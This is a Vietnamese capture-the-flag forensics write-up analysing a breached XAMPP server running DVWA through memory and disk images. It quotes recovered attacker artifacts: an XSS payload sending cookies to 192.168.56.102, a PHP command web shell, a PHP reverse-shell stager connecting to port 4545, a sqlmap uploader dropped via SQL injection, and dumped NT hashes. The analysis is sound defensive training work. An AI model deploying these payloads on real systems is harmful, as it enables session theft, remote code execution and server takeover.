## Description
> A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis.

> As a soc analyst, you are tasked with mounting the image to determine how the system was compromised and the actions/commands the attacker executed.
## Solution
### 1. What is the computer's name?
##### Ở câu hỏi này ta có thể xác định tên máy tính thông qua SYSTEM registry hive. 
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
```

```python
┌──(kali㉿kali)-[~/Personal/CTF/volatility]
└─$ python2 vol.py -f ~/Downloads/Cyberdefender/Breach/memdump.mem --profile=VistaSP1x86 printkey -o 0x86226008  -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2015-08-24 06:51:50 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-L0ZZQ76PMUF
```

### 2. What is the Timezone of the compromised machine? Format: UTC+0 (no-space)
##### Tương tự câu hỏi số 1 ta cũng xác định thông tin về múi giờ thông qua registry
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
```
![image](https://hackmd.io/_uploads/r1Qo9de5kg.png)
![image](https://hackmd.io/_uploads/H1cT5dg9yg.png)
##### Ta thấy rằng giá trị `ActiveTimeBias là 420` tương ứng với UTC-7

### 3. What was the first vulnerability the attacker was able to exploit?
##### Tiến hành load file s4a-challenge4 vào công cụ FTK Imager để phân tích ổ đĩa này.
##### Quan sát, ta thấy có 1 thư mục xampp chứa các thành phần của 1 webserver
![image](https://hackmd.io/_uploads/rkQ-zYgq1e.png)
##### Trong thư mục xampp bao gồm 1 thư mục apache nữa, cho ta biết nó web server này đang chạy trên máy chủ apache.
![image](https://hackmd.io/_uploads/rkmQXtecke.png)
##### Tiến hành kiểm tra log của nó tại apache/logs/access.log
##### Tại dòng log thứ 3292:
`::1 - - [01/Sep/2015:23:00:04 -0700] "GET /dvwa/security.php?test=%22><script>eval(window.name)</script> HTTP/1.1" 200 37 "http://localhost/dvwa/security.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"`
##### Ở endpoint `security.php` 1 đoạn script `<script>eval(window.name)</script>` được chèn vào sau tham số `test=` cho thấy 1 cuộc tấn công xss đang được diễn ra.
##### Ở các dòng log tiếp theo, 1 cuộc tấn công XSS Reflected được triển khai
```
::1 - - [01/Sep/2015:23:04:40 -0700] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F192.168.56.102%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E HTTP/1.1" 200 4548 "http://localhost/dvwa/vulnerabilities/xss_r/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"
```
##### Tham số truyền vào là : ``?name=<script>document.location="http://192.168.56.102/?"+document.cookie;</script> HTTP/1.1" 200 4548 "http://localhost/dvwa/vulnerabilities/xss_r/"``
##### Có thể hiểu nôm na rằng mã JavaScript này sẽ thực thi trên trình duyệt của nạn nhân và gửi cookie của nạn nhân đến máy chủ của attacker 192.168.56.102.
### 4. What is the OS build number?
##### Ta xác định `OS build number` ở `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion`
> Payload :  python2 vol.py -f ~/Downloads/Cyberdefender/Breach/memdump.mem --profile=VistaSP1x86 printkey -o 0x87b55a20 -K "Microsoft\Windows NT\CurrentVersion"

![image](https://hackmd.io/_uploads/rkNun_x9ke.png)

### 5. How many users are on the compromised machine?
##### Với câu hỏi này mình export file SAM ra để xem các user trên máy, nó nằm ở Windows/System32/config.
![image](https://hackmd.io/_uploads/B1Et3se9ke.png)
##### Ta thấy có 4 user trên máy

### 6. What is the webserver package installed on the machine?
##### Dựa theo những gì đã phân tích ở câu hỏi số 3 ta có thể biết rằng xampp được tải xuống và chạy trên máy
##### Ngoài ra ta cũng có thể tìm thấy file setup của nó ở user Administrator trong thư mục desktop.
![image](https://hackmd.io/_uploads/rkiuJxfc1x.png)


### 7. What is the name of the vulnerable web app installed on the webserver?
##### Truy cập vào folder htdocs ta thấy có 1 thư mục tên là `DVWA` - đây là viết tắt của Damn Vulnerable Web Application, một ứng dụng web dùng để thực hành kiểm thử bảo mật.
```
htdocs là thư mục gốc (document root) của Apache trong XAMPP hoặc các máy chủ web tương tự. Nó là nơi chứa các tệp và thư mục của website mà máy chủ web sẽ phục vụ cho người dùng khi truy cập.
```
##### Cấu trúc thư mục: Bên trong DVWA, có các thư mục đặc trưng như: 
    - Vulnerabilities/ chứa các thư mục con như sqli, xss_s, csrf, upload, exec... Đây là những kiểu lỗ hổng bảo mật phổ biến.
    - Hackable/ và webshells/ – Những thư mục này thường dùng để kiểm tra tấn công hoặc tải lên mã độc.
    - Thư mục external/phpids/: Đây là dấu hiệu của PHPIDS (PHP Intrusion Detection System), một hệ thống phát hiện xâm nhập thường tích hợp với DVWA để theo dõi các cuộc tấn công.
##### Dựa vào những yếu tố trên, có thể khẳng định DVWA là ứng dụng web dễ bị tấn công được cài đặt trên máy chủ web.

### 8. What is the user agent used in the HTTP requests sent by the SQL injection attack tool?
##### Nhìn vào log của cuộc tấn công sql ta dễ dàng xác định được user agent của nó 
![image](https://hackmd.io/_uploads/SkLBo1fcye.png)
> sqlmap/1.0-dev-nongit-20150902

### 9. The attacker read multiple files through LFI vulnerability. One of them is related to network configuration. What is the filename?
```
Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Lỗ hổng xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include. Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như “/”, “../”, “-“.
LFI là kỹ thuật đọc một file trong hệ thống, nếu khai thác được lỗi này, hacker có thể xem được rất nhiều thông tin của server như các file: passwd, php.ini, access_log,… (biết được các thông tin nhạy cảm) tùy theo mức độ bảo mật của server.
Lỗi LFI thường đi kèm với lỗi về Upload. Kẻ tấn công upload một file có chứa mã php lên server mà không cần thiết file đó phải có kiểu là .php. Sau đó sử dụng LFI này để đọc ra nội dụng file đã upload lên. Khi server đọc các file này, gặp mã php sẽ thực thi các mã này và như thế là thực hiện ý đồ của hacker.
```
##### Bây giờ ta quay lại file access.log của apache để xem những đoạn log có liên quan đến lỗ hổng này
##### Dựa vào tính chất của các đường dẫn mà attacker thường nhắm tới sẽ chứa các chuỗi như "../.." nhằm đi ngược ra khỏi thư mục apache để truy cập vào các file nhạy cảm.
##### Theo đó, dùng lệnh grep theo chuỗi "../.."
```
strings access.log | grep '\.\./\.\.' | awk -F'?page=' '{print $2}' | awk -F'HTTP' '{print $1}'
```
##### Và đây là tất cả các file attacker cố gắng truy cập thông qua lỗ hổng LFI
![image](https://hackmd.io/_uploads/SJe-xpY91l.png)
##### Theo như câu hỏi, có 1 file liên quan đến cấu hình mạng. Đó là file hosts
```
Tệp hosts trong Windows ánh xạ tên miền thành địa chỉ IP, ưu tiên hơn DNS, dùng để chặn web hoặc tạo domain cục bộ.
```

### 10. The attacker tried to update some firewall rules using netsh command. Provide the value of the type parameter in the executed command?

##### Với file memory được cung cấp, ta kiểm tra các lệnh được chạy trên máy bằng plugin consoles 
![image](https://hackmd.io/_uploads/SJhWiec91x.png)
##### Tại đây ta thấy 1 lệnh netsh được thực hiện 
```
netsh firewall set service type=remotedesktop mode=enable scope=subnet

netsh: Công cụ Network Shell, một công cụ dòng lệnh để cấu hình các thiết lập mạng
firewall: Chỉ định rằng bạn đang thực hiện thay đổi đối với Windows Firewall
set service: Cho biết bạn đang cấu hình một dịch vụ được xác định trước
type=remotedesktop: Chỉ định bạn đang cấu hình dịch vụ Remote Desktop
mode=enable: Bật ngoại lệ tường lửa cho dịch vụ này
scope=subnet: Giới hạn ngoại lệ chỉ cho phép kết nối từ các máy tính trong cùng mạng con/subnet
```

### 11. How many users were added by the attacker?
##### Quan sát tiếp lịch sử lệnh, ngay sau khi set rule của firewall xong attacker tiến hành tạo tài khoản user1 và cấp quyền Remote Desktop
![image](https://hackmd.io/_uploads/H1obne951e.png)
##### Tiếp tục xem các user ở SAM registry hive như ở Q5.
##### Thời gian tạo của 2 user tương đồng nhau, cho thấy chúng cùng được tạo từ 1 vụ tấn công
![image](https://hackmd.io/_uploads/S1CTebcq1x.png)


### 12. When did the attacker create the first user?
##### Dựa vào phân tích ở câu 11 ta xác định được user1 được tạo trước vào lúc `2015-09-02 09:05:06 UTC`


### 13. What is the NThash of the user's password set by the attacker?
##### Sử dụng plugin `hashdump` có sẵn trên volatility để trích xuất NThash
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:63d6a39b8467b94ae92ab1931d4079dd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user1:1005:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
hacker:1006:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
```
> Kết quả là 817875ce4794a9262159186413772644


### 14. What is The MITRE ID corresponding to the technique used to keep persistence?

##### Tìm kiếm trên internet với từ khóa "net user add MITRE ID" ta tìm thấy nguồn sau:
- https://attack.mitre.org/techniques/T1136/
##### Dựa vào đó ta có thể xác định được MITRE ID là T1136.001

### 15. The attacker uploaded a simple command shell through file upload vulnerability. Provide the name of the URL parameter used to execute commands?

![image](https://hackmd.io/_uploads/B1pWz9991l.png)
##### Dựa vào các IOC trên, mình tìm kiếm các phần mở rộng này từ file access.log.
> strings access.log| grep -iE "\.php|\.asp|\.jsp|\.exe" 
![image](https://hackmd.io/_uploads/rJprP9991g.png)
##### Ta thấy rằng attacker đang cố gắng khai thác thông qua tệp shell phpshell.php ở thư mục uploads và tham số `cmd=`
##### Cuối cùng là chạy file phpshell2.php thông qua GET, xem thông tin chi tiết qua bảng sau:
| **Thời gian**                                | **Yêu cầu**                                                                  | **Mục đích**                                                                                                   |
|---------------------------------------------|-------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| [03/Sep/2015:00:15:58 -0700]               | GET /dvwa/hackable/uploads/phpshell.php HTTP/1.1                              | Truy cập trang PHP shell để thực thi mã PHP.                                                                   |
| [03/Sep/2015:00:16:03 -0700]               | GET /dvwa/hackable/uploads/phpshell.php?dir HTTP/1.1                          | Kiểm tra nội dung thư mục trong PHP shell.                                                                     |
| [03/Sep/2015:00:16:13 -0700]               | GET /dvwa/hackable/uploads/phpshell.php?cmd=dir HTTP/1.1                      | Thực thi lệnh `dir` trong PHP shell để liệt kê các thư mục và tập tin.                                         |
| [03/Sep/2015:00:17:49 -0700]               | GET /dvwa/hackable/uploads/phpshell.php?cmd=dir%20C:\\ HTTP/1.1               | Thực thi lệnh `dir` trên ổ đĩa C:\ để xem danh sách thư mục và tập tin trên hệ thống Windows.               |
| [03/Sep/2015:00:17:58 -0700]               | GET /dvwa/hackable/uploads/phpshell.php?cmd=mkdir%20abc HTTP/1.1              | Tạo thư mục mới tên là `abc` trong hệ thống.                                                                  |
| [03/Sep/2015:00:18:02 -0700]               | GET /dvwa/hackable/uploads/phpshell.php?cmd=dir HTTP/1.1                      | Kiểm tra lại nội dung thư mục sau khi thực hiện lệnh tạo thư mục.                                            |
| [03/Sep/2015:00:18:58 -0700]               | GET /dvwa/hackable/uploads/phpshell.php HTTP/1.1                              | Truy cập lại trang PHP shell.                                                                                 |
| [03/Sep/2015:00:31:54 -0700]               | GET /dvwa/hackable/uploads/phpshell2.php HTTP/1.1                             | Truy cập một tệp PHP shell khác để thực thi các lệnh hoặc kiểm tra thông tin.                                |
##### Truy cập vào `xampp/htdocs/DVWA/hackable/uploads/` để xem nội dung file shell
##### Đây là nội dung file phpshell.php
```php
<?php
system($_GET["cmd"]);

?>
```
##### Đoạn mã php này nhận lệnh từ tham số cmd= sau đó thực thi trên hệ thống 
##### Đây là nội dung file phpshell2.php
```php
//<?php error_reporting(0); $ip = '192.168.56.102'; $port = 4545; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();
```
##### Đoạn mã này tiến hành thiết lập kết nối và thực thi các mã nhận từ server 192.168.56.102 ở cổng 4545

### 16. One of the uploaded files by the attacker has an md5 that starts with "559411". Provide the full hash.

```
└─$ find xampp/ -type f -exec md5sum {} \; | grep -i 559411                                                                                                           
5594112b531660654429f8639322218b  xampp/htdocs/DVWA/webshell.php
```

### 17. The attacker used Command Injection to add user "hacker" to the "Remote Desktop Users" Group. Provide the IP address that was part of the executed command?

##### Dựa vào các thông tin đã biết trong acccess.log ta có thể xác nhận rằng ip của attacker là `192.168.56.102`
##### Ngoài ra ta cũng có thể tìm thấy thông qua file memory
![image](https://hackmd.io/_uploads/BJ_AInc5ye.png)

### 18. The attacker dropped a shellcode through SQLi vulnerability. The shellcode was checking for a specific version of PHP. Provide the PHP version number?

##### Tiếp tục quay lại với access.log, mình tìm thấy 1 yêu cầu HTTP GET có chứa một cuộc tấn công SQL Injection (SQLi). Cụ thể, đây là một yêu cầu cố gắng chèn mã PHP vào một tệp trên máy chủ thông qua lỗ hổng SQLi. Đoạn mã chính đã bị mã hóa hex.
![image](https://hackmd.io/_uploads/rkU4qhcc1e.png)
##### `LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpudvfh.php'` yêu cầu MySQL ghi kết quả truy vấn ra một tệp mới có tên tmpudvfh.php tại thư mục /xampp/htdocs/ bằng cách ghi các byte tương ứng vào tệp. 
##### Để xác định nội dung file `tmpudvfh.php` ta cần chuyển đổi nó từ hex về dạng ascii
![image](https://hackmd.io/_uploads/Hy_4gA55yg.png)
```python
<?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}
?>
```
##### Đoạn mã này là một file uploader cơ bản, cho phép người dùng chọn file, xác định thư mục đích và upload file lên máy chủ sử dụng các phiên bản php quanh phiên bản `4.1.0`